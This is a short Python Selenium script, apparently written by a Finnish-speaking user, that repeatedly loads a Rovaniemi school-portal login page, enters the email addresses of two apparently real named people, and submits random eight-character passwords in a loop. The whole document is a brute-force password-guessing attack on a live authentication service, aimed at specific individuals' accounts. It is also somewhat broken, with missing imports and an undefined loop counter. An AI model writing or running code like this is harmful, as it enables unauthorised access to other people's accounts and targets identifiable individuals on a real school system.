
aakkoset = "012356789abcdefghijklmnopqrstuväö"
isotk = "ABCDEFGHIJKLMNOPQRSTUVÄÖ"

selain = webdriver.Chrome()
palli = webdriver.Chrome()
selain.get("https://rovaniemi.inschool.fi/?loginfailed")
kirjoitus = selain.find_element_by_id("login-frontdoor")
salasana = selain.find_element_by_id("password")
    
kirjoitus.send_keys("emilia.aho@lappee.fi")
salasana.send_keys(random.choice(isotk))
salasana.send_keys(random.choice(aakkoset))
salasana.send_keys(random.choice(aakkoset))
salasana.send_keys(random.choice(aakkoset))
salasana.send_keys(random.choice(aakkoset))
salasana.send_keys(random.choice(aakkoset))
salasana.send_keys(random.choice(aakkoset))
salasana.send_keys(random.choice(aakkoset))
time.sleep(0.1)
salasana.send_keys(Keys.RETURN)
time.sleep(1)

while i < 1:
    kirjoitus = selain.find_element_by_id("login-frontdoor")
    salasana = selain.find_element_by_id("password")
    kirjoitus.send_keys("hugo.mattila@roiedu.fi")
    salasana.send_keys(random.choice(isotk))
    salasana.send_keys(random.choice(aakkoset))
    salasana.send_keys(random.choice(aakkoset))
    salasana.send_keys(random.choice(aakkoset))
    salasana.send_keys(random.choice(aakkoset))
    salasana.send_keys(random.choice(aakkoset))
    salasana.send_keys(random.choice(aakkoset))
    salasana.send_keys(random.choice(aakkoset))
    time.sleep(0.1)
    salasana.send_keys(Keys.RETURN)
